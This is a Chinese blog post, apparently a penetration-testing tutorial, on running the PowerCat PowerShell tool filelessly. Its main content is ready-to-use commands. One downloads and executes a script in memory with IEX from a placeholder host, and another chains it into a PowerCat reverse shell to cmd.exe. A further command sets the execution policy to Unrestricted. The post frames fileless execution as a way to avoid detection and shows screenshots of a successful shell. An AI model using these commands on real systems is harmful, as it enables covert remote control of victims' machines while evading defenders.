
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/D1TA/p/18631292" title="发布于 2024-12-25 19:28">
    <span role="heading" aria-level="2">Powercat 无文件落地执行技巧，你确定不进来看看？</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>声明：本文主要用作技术分享，所有内容仅供参考。任何使用或依赖于本文信息所造成的法律后果均与本人无关。请读者自行判断风险，并遵循相关法律法规。</p>
<p></p><div class="toc"><div class="toc-container-header">目录</div><ul><li><a href="#完整示例" rel="noopener nofollow">完整示例</a></li><li><a href="#注意事项" rel="noopener nofollow">注意事项</a></li><li><a href="#演示" rel="noopener nofollow">演示</a></li></ul></div><p></p>
<p>无文件落地执行（fileless execution）是一种技术，用于避免在磁盘上留下文件痕迹，使得恶意行为更难被检测到。PowerCat 是一个基于 PowerShell 的渗透测试工具，可以使用 PowerShell 的特性实现无文件落地执行。</p>
<ol>
<li>
<p><strong>准备 PowerCat 脚本</strong>：将 PowerCat 的脚本托管在一个可以访问的远程服务器上，比如 GitHub Gist、Pastebin 或自建的 HTTP 服务器。</p>
</li>
<li>
<p><strong>使用 PowerShell 命令直接从远程服务器下载并执行脚本</strong>：</p>
<ul>
<li>使用 <code>IEX</code>（Invoke-Expression）和 <code>Invoke-WebRequest</code> 或 <code>Invoke-RestMethod</code> 组合可以直接在内存中加载和执行脚本。</li>
<li>以下是一个示例命令，通过 PowerShell 从远程服务器下载并执行 PowerCat：</li>
</ul>
</li>
</ol>
<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('https://example.com/path/to/powercat.ps1')
</code></pre>
<p>或者使用 <code>Invoke-RestMethod</code>：</p>
<pre><code class="language-powershell">IEX (Invoke-RestMethod -Uri 'https://example.com/path/to/powercat.ps1')
</code></pre>
<ol start="3">
<li><strong>执行 PowerCat 命令</strong>：在内存中加载 PowerCat 后，直接使用 PowerCat 提供的功能进行渗透测试。例如，使用 PowerCat 建立反向 shell：</li>
</ol>
<pre><code class="language-powershell">powercat -c target_ip -p target_port -e cmd.exe
</code></pre>
<h5 id="完整示例">完整示例</h5>
<p>假设 PowerCat 脚本托管在 <code>https://example.com/path/to/powercat.ps1</code>：</p>
<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('https://example.com/path/to/powercat.ps1'); powercat -c target_ip -p target_port -e cmd.exe
</code></pre>
<p>此命令会在内存中下载并执行 PowerCat 脚本，并立即通过 PowerCat 建立反向 shell 连接。</p>
<h5 id="注意事项">注意事项</h5>
<ul>
<li>
<p><strong>安全性</strong>：确保托管脚本的远程服务器是安全的，防止脚本被篡改。</p>
</li>
<li>
<p><strong>权限</strong>：PowerShell 执行策略可能会限制脚本执行。需要以管理员权限运行 PowerShell 或调整执行策略：</p>
</li>
</ul>
<pre><code class="language-powershell">Set-ExecutionPolicy Unrestricted -Scope Process
</code></pre>
<ul>
<li><strong>检测和防御</strong>：尽管无文件落地执行可以降低被检测的可能性，但仍有其他检测和防御手段，例如基于行为的检测，因此在实际渗透测试中要综合考虑多种手段。</li>
</ul>
<p>通过这些步骤，你可以实现 PowerCat 的无文件落地执行，直接在内存中下载并执行 PowerCat 脚本。</p>
<h5 id="演示">演示</h5>
<p>远端机开启web服务，用于被控端下载powercat 脚本<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192238743-1288239076.png" alt="" loading="lazy"></p>
<p>攻击机开启监听<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192324819-2114882386.png" alt="" loading="lazy"></p>
<p>执行命令<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192345028-2087607265.png" alt="" loading="lazy"></p>
<p>攻击端成功接收<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192411316-2110326406.png" alt="" loading="lazy"></p>
<p>查看被控端执行目录文件列表，不存在powercat.ps1 文件，说明文件未落地执行，直接在内存中执行。<br>
<img src="https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192430119-122322500.png" alt="" loading="lazy"></p>
<p>当然除了使用 IEX 进行无文件落地，还可以使用的方法有 4 种。<br>
欢迎关注 公众号 “D1TASec” 查看文章。</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.200575625875" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2024-12-25 19:28">2024-12-25 19:28</span>&nbsp;
<a href="https://www.cnblogs.com/D1TA">D1TAsec</a>&nbsp;
阅读(<span id="post_view_count">23</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18631292" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18631292);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18631292', targetLink: 'https://www.cnblogs.com/D1TA/p/18631292', title: 'Powercat 无文件落地执行技巧，你确定不进来看看？' })">举报</a>
</div>
        